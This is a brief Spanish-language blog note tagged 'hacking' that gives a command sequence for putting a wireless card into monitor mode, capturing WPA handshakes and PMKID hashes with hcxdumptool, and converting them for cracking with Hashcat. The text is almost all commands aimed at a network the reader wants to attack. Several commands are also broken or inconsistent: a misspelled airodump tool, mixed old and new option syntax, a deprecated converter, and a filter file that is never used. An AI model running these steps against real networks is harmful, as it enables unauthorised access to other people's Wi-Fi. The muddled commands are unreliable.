---
title: "Capturar handshakes y ataques PMKID con Hcxdumptool"
date: 2025-02-16T13:16:01-03:00
tags: ['hacking']
---
`hcxdumptool -> hcxpcapngtool -> hcxhashtool (additional hcxpsktool/hcxeiutool) -> Hashcat`

```bash
sudo su
airmon-ng check kill
airmon-ng start wlp1s0 # Modo monitor
airdump-ng wlp1s0 # Guarda la BSSID de la red que querés atacar en un archivo de texto
echo "BSSID" > myfilter.txt
hcxdumptool -i wlp1s0 -w dumpfile.pcapng -F --rds=1
hcxdumptool -o capture.pcap -i wlp1s0 
hcxpcaptool -m pmkid_hash.txt capture.pcap
```

Es importante tener la última versión: 

```bash
git clone https://github.com/ZerBea/hcxdumptool
make
sudo make install
hcxdumptool -I 
hcxdumptool -i INTERFACE -o file.pcapng --active_beacon --enable_status=15

```



https://miloserdov.org/?p=7801
